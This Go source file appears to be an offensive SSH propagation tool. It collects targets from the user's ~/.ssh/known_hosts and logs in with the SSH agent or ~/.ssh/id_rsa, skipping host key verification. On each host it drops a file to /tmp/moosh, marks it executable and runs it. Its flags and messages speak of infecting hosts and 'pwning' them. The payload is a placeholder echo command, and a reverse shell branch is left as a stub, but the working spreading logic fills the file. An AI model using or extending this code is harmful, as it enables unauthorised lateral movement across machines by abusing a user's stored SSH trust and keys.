package main

import (
	"bufio"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"regexp"
	"strings"

	"github.com/pkg/errors"
	"golang.org/x/crypto/ssh"
	"golang.org/x/crypto/ssh/agent"
)

// TODO: add shellcode of the exploit - maybe generate it?
var Moosh64 = []byte("'echo hello > /tmp/hello'")
var Moosh86 = []byte("'echo hello > /tmp/hello'")

type SSHConfig struct {
	UseAgent   bool
	PrivateKey string
	Username   string
	Addr       string
}

type SSHRunner struct {
	*ssh.Client
}

func NewSSHRunner(c SSHConfig) (*SSHRunner, error) {
	var auth []ssh.AuthMethod
	if c.UseAgent {
		sock := os.Getenv("SSH_AUTH_SOCK")
		if sock == "" {
			return nil, errors.New("SSH_AUTH_SOCK must be set to use SSH agent")
		}

		a, err := net.Dial("unix", sock)
		if err != nil {
			return nil, errors.Wrap(err, "failed to connect to SSH agent")
		}
		auth = append(auth, ssh.PublicKeysCallback(agent.NewClient(a).Signers))
	} else {
		kp := c.PrivateKey
		if kp == "" {
			u, err := user.Current()
			if err != nil {
				return nil, errors.Wrap(err, "failed to get current user")
			}

			kp = filepath.Join(u.HomeDir, ".ssh", "id_rsa")
		}

		b, err := ioutil.ReadFile(kp)
		if err != nil {
			return nil, errors.Wrap(err, "failed to read private key")
		}

		key, err := ssh.ParsePrivateKey(b)
		if err != nil {
			return nil, errors.Wrap(err, "failed to parse private key")
		}

		auth = append(auth, ssh.PublicKeys(key))
	}

	cl, err := ssh.Dial("tcp", c.Addr, &ssh.ClientConfig{
		Auth:            auth,
		User:            c.Username,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	})
	if err != nil {
		return nil, errors.Wrap(err, "failed to connect to host via SSH")
	}
	return &SSHRunner{
		Client: cl,
	}, nil
}

func (r SSHRunner) Run(cmd string) error {
	s, err := r.Client.NewSession()
	if err != nil {
		return errors.Wrap(err, "failed to create new SSH session")
	}

	if out, err := s.CombinedOutput(cmd); err != nil {
		return errors.Wrapf(err, "failed to run command, output: %s", out)
	}
	return nil
}

func (r SSHRunner) RunShellCode(b []byte) error {
	return r.Run(fmt.Sprintf("echo %s > /tmp/moosh && chmod +x /tmp/moosh && /tmp/moosh", string(b)))
}

type Runner interface {
	Run(cmd string) error
}

type ShellCodeRunner interface {
	RunShellCode(b []byte) error
}

func ParseKnownHosts() (addrs []string, ferr error) {
	file, err := os.Open(filepath.Join(os.Getenv("HOME"), ".ssh", "known_hosts"))
	if err != nil {
		ferr = errors.Wrap(err, "failed to open known_hosts file")
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		if match, _ := regexp.MatchString("^[#@|]", line); match == true {
			// the line is commented out, has a marker or has (a) hashed hostname(s)
			continue
		}
		fields := strings.Split(line, " ")
		if len(fields) < 3 {
			// the line is missing mandatory fields, so it's probably invalid
			continue
		}
		rawaddrs := strings.Split(fields[0], ",")
		for _, rawaddr := range rawaddrs {
			var addr string
			fullspec, _ := regexp.Compile("\\[(.*)\\]:(.*)")
			if fullspec.MatchString(rawaddr) {
				// the address has a custom port
				parts := fullspec.FindStringSubmatch(rawaddr)
				if len(parts) != 3 {
					msg := fmt.Sprintf("error parsing %q", rawaddr)
					ferr = errors.New(msg)
					return
				}
				addr = parts[1] + ":" + parts[2]
			} else {
				addr = rawaddr + ":22"
			}
			addrs = append(addrs, addr)
		}
	}

	ferr = nil
	return
}

func main() {
	addr := flag.String("addr", "", "The lucky guy")
	agent := flag.Bool("agent", false, "Whether or not to use SSH agent")
	arch := flag.String("arch", "x64", "Bitness of the system, (x64 or x86)")
	useSSH := flag.Bool("ssh", false, "Use SSH for the infection")
	user := flag.String("user", "averagejoe", "Username to connect as(e.g. for SSH)")
	known := flag.Bool("known", false, "Whether or not to try to infect all hosts in SSH known_hosts file")
	flag.Parse()

	if *arch != "x86" && *arch != "x64" || *addr == "" && !*known {
		flag.Usage()
		os.Exit(1)
	}

	b := Moosh64
	if *arch == "x86" {
		b = Moosh86
	}

	switch {
	case *useSSH:
		var addrs []string
		if *addr != "" {
			addrs = append(addrs, *addr)
		}

		if *known {
			knownaddrs, err := ParseKnownHosts()
			if err != nil {
				log.Fatalln("Error parsing known hosts")
			}
			addrs = append(addrs, knownaddrs...)
		}

		if len(addrs) == 0 {
			log.Fatalf("No hosts to infect")
		}

		for _, a := range addrs {
			r, err := NewSSHRunner(SSHConfig{
				Addr:     a,
				UseAgent: *agent,
				Username: *user,
			})
			if err != nil {
				log.Printf("Failed to initialize SSH connection: %s", err)
				continue // try next host
			}

			if err = r.RunShellCode(b); err != nil {
				log.Fatalf("Failed to pwn %s: %s", *addr, err)
			}
		}
	default:
		// TODO: attempt to connect to the backdoor
		// and return the reverse shell
		sh := exec.Command("#open reverse shell")
		sh.Stderr = os.Stderr
		sh.Stdout = os.Stdout
		sh.Stdin = os.Stdin
		if err := sh.Start(); err != nil {
			log.Fatalf("Failed to open reverse shell: %s", err)
		}
	}
}
